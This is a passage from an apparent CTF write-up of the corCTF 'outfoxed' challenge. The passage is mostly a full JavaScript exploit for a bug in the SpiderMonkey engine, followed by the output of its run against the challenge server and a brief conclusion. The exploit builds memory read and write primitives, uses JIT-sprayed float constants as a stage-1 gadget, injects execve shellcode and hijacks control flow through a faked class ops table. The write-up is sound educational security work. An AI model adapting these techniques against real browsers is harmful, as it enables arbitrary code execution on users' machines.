<span class="nx">print</span><span class="p">(</span><span class="s2">`stage1_addr = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">stage1_addr</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
</code></pre></div></div>

<p>That’s basically it, not we just have to put it all together</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">converter</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">u64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nx">converter</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">f64view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">converter</span><span class="p">);</span>

<span class="c1">// Bit-cast an uint64_t to a float64</span>
<span class="kd">function</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="c1">// Bit-cast a float64 to an uint64_t</span>
<span class="kd">function</span> <span class="nx">d2i</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">f64view</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">x</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">u64view</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">print</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="s2">`0x</span><span class="p">${</span><span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">assert</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// https://github.com/vigneshsrao/CVE-2019-11707/blob/master/exploit.js#L196</span>
<span class="c1">// mprotects the shellcode whose address is in [rcx] as rwx and jumps to it</span>
<span class="kd">function</span> <span class="nx">jitme</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">magic</span> <span class="o">=</span> <span class="mf">4.183559446463817</span><span class="nx">e</span><span class="o">-</span><span class="mi">216</span><span class="p">;</span>

    <span class="kd">const</span> <span class="nx">g1</span> <span class="o">=</span> <span class="mf">1.4501798452584495</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">g2</span> <span class="o">=</span> <span class="mf">1.4499730218924257</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">g3</span> <span class="o">=</span> <span class="mf">1.4632559875735264</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">g4</span> <span class="o">=</span> <span class="mf">1.4364759325952765</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">g5</span> <span class="o">=</span> <span class="mf">1.450128571490163</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">g6</span> <span class="o">=</span> <span class="mf">1.4501798485024445</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">g7</span> <span class="o">=</span> <span class="mf">1.4345589835166586</span><span class="nx">e</span><span class="o">-</span><span class="mi">277</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">g8</span> <span class="o">=</span> <span class="mf">1.616527814</span><span class="nx">e</span><span class="o">-</span><span class="mi">314</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="c1">// Read 64 bits from addr</span>
    <span class="kd">function</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">olddata</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">);</span>
        <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">addr</span><span class="p">))</span>
        <span class="kd">const</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="nx">olddata</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Write 64 bits to addr</span>
    <span class="kd">function</span> <span class="nx">write64</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">olddata</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">);</span>
        <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">addr</span><span class="p">));</span>
        <span class="nx">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
        <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="nx">olddata</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Read size bytes from addr</span>
    <span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">assert</span><span class="p">(</span><span class="nx">size</span> <span class="o">%</span> <span class="mi">8</span><span class="nx">n</span> <span class="o">===</span> <span class="mi">0</span><span class="nx">n</span><span class="p">);</span>
        <span class="kd">let</span> <span class="nx">ret</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="nb">Number</span><span class="p">(</span><span class="nx">size</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">size</span> <span class="o">/</span> <span class="mi">8</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">ret</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addr</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">ret</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Return the address of a JavaScript object</span>
    <span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">a</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="nx">x</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffff</span><span class="nx">n</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">jitme</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">const</span> <span class="nx">addrof_jitme</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">jitme</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">codepage_addr</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">read64</span><span class="p">(</span><span class="nx">addrof_jitme</span> <span class="o">+</span> <span class="mh">0x28</span><span class="nx">n</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="nx">n</span><span class="p">;</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`addrof(jitme) = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">addrof_jitme</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`code page at = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">codepage_addr</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

    <span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">codepage_addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="nx">n</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">stage1_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">code</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x13</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span>
            <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x13</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x13</span>
            <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x37</span> <span class="o">&amp;&amp;</span> <span class="nx">code</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x13</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">stage1_offset</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">14</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">assert</span><span class="p">(</span><span class="nx">stage1_offset</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">stage1_addr</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">stage1_offset</span><span class="p">)</span> <span class="o">+</span> <span class="nx">codepage_addr</span><span class="p">;</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`stage1_addr = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">stage1_addr</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

    <span class="c1">// execve('/reader')</span>
    <span class="kd">const</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xf</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">]);</span>

    <span class="kd">const</span> <span class="nx">addrof_shellcode</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">shellcode_shape</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addrof_shellcode</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">shellcode_base_shape</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">shellcode_shape</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">shellcode_class</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">shellcode_base_shape</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">shellcode_ops</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">shellcode_class</span> <span class="o">+</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">shellcode_data</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addrof_shellcode</span> <span class="o">+</span> <span class="mh">0x30</span><span class="nx">n</span><span class="p">);</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`addrof(shellcode) = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">addrof_shellcode</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`shellcode-&gt;shape = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">shellcode_shape</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`shellcode-&gt;shape-&gt;base_shape = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">shellcode_base_shape</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`shellcode-&gt;shape-&gt;base_shape-&gt;class = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">shellcode_class</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`shellcode-&gt;shape-&gt;base_shape-&gt;class-&gt;ops = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">shellcode_ops</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`shellcode-&gt;data = </span><span class="p">${</span><span class="nx">hex</span><span class="p">(</span><span class="nx">shellcode_data</span><span class="p">)}</span><span class="s2">`</span><span class="p">);</span>

    <span class="kd">const</span> <span class="nx">fake_class</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">48</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">fake_class_buffer</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">fake_class</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x30</span><span class="nx">n</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">fake_class</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">shellcode_class</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">const</span> <span class="nx">fake_ops</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">(</span><span class="mi">88</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">fake_ops_buffer</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">fake_ops</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x30</span><span class="nx">n</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">11</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">fake_ops</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">read64</span><span class="p">(</span><span class="nx">shellcode_ops</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nx">fake_ops</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">stage1_addr</span><span class="p">;</span>
    <span class="nx">fake_class</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">fake_ops_buffer</span><span class="p">;</span>
    <span class="nx">write64</span><span class="p">(</span><span class="nx">shellcode_base_shape</span><span class="p">,</span> <span class="nx">fake_class_buffer</span><span class="p">);</span>

    <span class="nx">shellcode</span><span class="p">.</span><span class="nx">someprop</span> <span class="o">=</span> <span class="nx">i2d</span><span class="p">(</span><span class="nx">shellcode_data</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">try</span> <span class="p">{</span>
    <span class="nx">pwn</span><span class="p">();</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">`Got exception: </span><span class="p">${</span><span class="nx">e</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 upload.py
[+] Opening connection to outfoxed.be.ax on port 37685: Done
[*] Switching to interactive mode
Enter exploit followed by EOF: 
[GFX1-]: glxtest: libpci missing
[GFX1-]: glxtest: libGL.so.1 missing
[GFX1-]: glxtest: libEGL missing
[GFX1-]: No GPUs detected via PCI
[GFX1-]: RenderCompositorSWGL failed mapping default framebuffer, no dt
corctf{just_4_b4by_f0x}
[*] Interrupted
[*] Closed connection to outfoxed.be.ax port 37685
</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>In this challenge we exploited a bug in SpiderMonkey to gain arbitrary native
code execution. I had never worked with Firefox before so this was a nice change
from the usual Chrome challenges and at the same time it shows how similar the
various JS engines are. Thanks to the author for writing this!</p>




<!--       <footer class="site-footer">
        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
      </footer> -->

      <div class="lever-meme">
        <div id="lever" class="lever-off"></div>
      </div>

      <div class="twitter">
        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
      </div>

      <script>
        let leverCount = 0;
        let manic = false;

        function resetLever() {
            leverCount = 0;
            setTimeout(resetLever, 1750);
        }

        resetLever();

        document.getElementById('lever')
        .addEventListener('click', function (event) {
          if(leverCount > 10){
            manic = true;
            document.getElementById("lever").classList.add('lever-manic');
            document.getElementById("header-logo").classList.add('rainbow');
          }

          if(!manic){
            document.getElementById("lever").classList.toggle('lever-on');
            ++leverCount;
          }
        });


      </script>

      <script>
      function updateThemeToggleFooter() {
        let elem = document.querySelector('#lever');
        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
      }

      (function() {
        updateThemeToggleFooter()
      })();

      function togglePageContentLightDark() {
          var html = document.getElementsByTagName('html')[0]
          var currentClass = html.className
          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
          html.className = newClass

          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
          console.log('Cookies are now: ' + document.cookie)

          updateThemeToggleFooter()
      }

      const btn = document.querySelector("#lever");
      btn.addEventListener("click", function() {
        togglePageContentLightDark();
      });
      </script>
    </main>
  </body>
</html>
